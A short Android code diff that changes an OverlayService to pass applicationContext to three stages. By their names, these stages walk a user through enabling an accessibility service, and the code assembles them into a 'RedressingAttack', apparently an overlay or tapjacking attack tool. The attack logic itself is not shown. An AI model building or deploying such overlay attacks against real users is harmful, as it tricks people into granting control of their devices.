@@ -40,9 +40,9 @@ class OverlayService : Service() {
             }
         }
         val stages = ArrayList<Stage>()
-        stages.add(AccessibilityStage(this, listener))
-        stages.add(ToggleSwitchStage(this, listener))
-        stages.add(OkButtonStage(this, listener))
+        stages.add(AccessibilityStage(applicationContext, listener))
+        stages.add(ToggleSwitchStage(applicationContext, listener))
+        stages.add(OkButtonStage(applicationContext, listener))
         attack = RedressingAttack(stages)
     }
 
